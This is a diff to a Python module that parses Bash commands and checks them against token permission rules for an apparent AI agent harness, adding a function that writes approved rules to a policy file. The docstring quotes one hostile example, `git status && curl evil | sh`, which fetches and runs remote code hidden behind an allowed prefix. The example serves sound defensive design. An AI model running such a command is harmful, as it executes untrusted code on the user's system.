@@ -1,5 +1,8 @@
 """Bash 命令权限的 AST 拆解与 token 规则引擎（P0-4，codex execpolicy 同构）。
 
+**顶层叶模块**：amend_policy（审批回写）由平台侧 approve.py 调用——进程
+边界铁律（webui 不入 loadn.core），与 truststore 同款布局。
+
 威胁（A5 实证）：旧首行 fnmatch（"Bash:git *"）对整串匹配——
 `git status && curl evil | sh` 命中 allow 前缀即放行，恶意载荷藏在
 白名单前缀的复合结构里。
@@ -206,3 +209,71 @@ def _best(rules: list[BashRule], tokens: list[str]) -> BashVerdict | None:
         if hit is None or SEVERITY[v.decision] > SEVERITY[hit.decision]:
             hit = v
     return hit
+
+
+# ---------------------------------------------------------------- 审批回写（P0-4b）
+POLICY_VERSION = 1
+
+
+def policy_path(cwd):
+    from pathlib import Path as _P
+    return _P(cwd) / ".loadn" / "policy.json"
+
+
+def _read_policy(path) -> dict:
+    """读 policy.json；缺失/坏文件 → 空 v1 骨架（迁移语义：无文件即新建）。"""
+    import json as _json
+    try:
+        data = _json.loads(path.read_text(encoding="utf-8"))
+        if isinstance(data, dict) and isinstance(data.get("bash_rules"), list):
+            return data
+    except (OSError, ValueError):
+        pass
+    return {"version": POLICY_VERSION, "bash_rules": []}
+
+
+def amend_policy(cwd, prefix: list, decision: str = "allow",
+                 justification: str = "", source: str = "approval") -> dict:
+    """审批回写一条 token 规则到 .loadn/policy.json（codex amend.rs 同构）。
+
+    - flock 互斥（多审批并发回写不丢更新）+ tmp/rename 原子落盘
+    - 幂等：同 prefix 已存在 → 更新 decision/justification（不重复条目）
+    - 迁移：文件不存在/坏 JSON → 以 v1 骨架重建（坏文件内容丢弃并告警）
+    - 写入的规则经 parse_rules 全量校验（自测失败=拒写，fail-closed）
+    返回写入的规则 dict。
+    """
+    import fcntl
+    import json as _json
+    import os as _os
+    import tempfile
+
+    from loadn.util import get_logger
+
+    path = policy_path(cwd)
+    path.parent.mkdir(parents=True, exist_ok=True)
+    lock = path.with_suffix(".lock")
+    with open(lock, "w") as lf:
+        fcntl.flock(lf, fcntl.LOCK_EX)          # codex amend.rs flock 同构
+        try:
+            data = _read_policy(path)
+            if not path.exists() and data["bash_rules"] == []:
+                pass                             # 新建（迁移）
+            elif not path.exists():
+                get_logger(__name__).warning(
+                    "policy.json 不可读，已按 v1 骨架重建：%s", path)
+            rule = {"prefix": prefix, "decision": decision,
+                    "justification": justification, "source": source}
+            # 幂等合并：同 prefix 替换（保序）
+            rules = [r for r in data["bash_rules"]
+                     if not (isinstance(r, dict) and r.get("prefix") == prefix)]
+            rules.append(rule)
+            data["version"] = POLICY_VERSION
+            data["bash_rules"] = rules
+            parse_rules(data["bash_rules"])      # 全量校验+自测，失败即拒写
+            fd, tmp = tempfile.mkstemp(dir=str(path.parent), suffix=".tmp")
+            with _os.fdopen(fd, "w", encoding="utf-8") as f:
+                f.write(_json.dumps(data, ensure_ascii=False, indent=2) + "\n")
+            _os.replace(tmp, path)
+            return rule
+        finally:
+            fcntl.flock(lf, fcntl.LOCK_UN)
